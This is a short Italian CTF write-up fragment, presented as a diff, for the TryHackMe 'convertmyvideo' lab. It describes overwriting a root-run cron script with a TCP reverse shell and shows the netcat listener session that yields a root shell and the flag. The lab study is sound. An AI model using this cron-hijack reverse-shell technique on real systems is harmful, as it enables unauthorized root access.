@@ -1,0 +1,23 @@
+una volta dentro, con pspy64 si nota l'esecuzione di un cron (root)
+
+il cron è questo:
+
+cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh
+
+
+si sovrascrive dunque clean.sh con una reverse shell tcp
+
+risultato:
+
+root@kali:/opt/TryHackMe/convertmyvideo# nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.8.147.132] from (UNKNOWN) [10.10.191.208] 60498
+bash: cannot set terminal process group (1358): Inappropriate ioctl for device
+bash: no job control in this shell
+root@dmv:/var/www/html/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@dmv:/var/www/html/tmp# cat /root/root.txt
+cat /root/root.txt
+flag{d9b368018e912b541a4eb68399c5e94a}
+
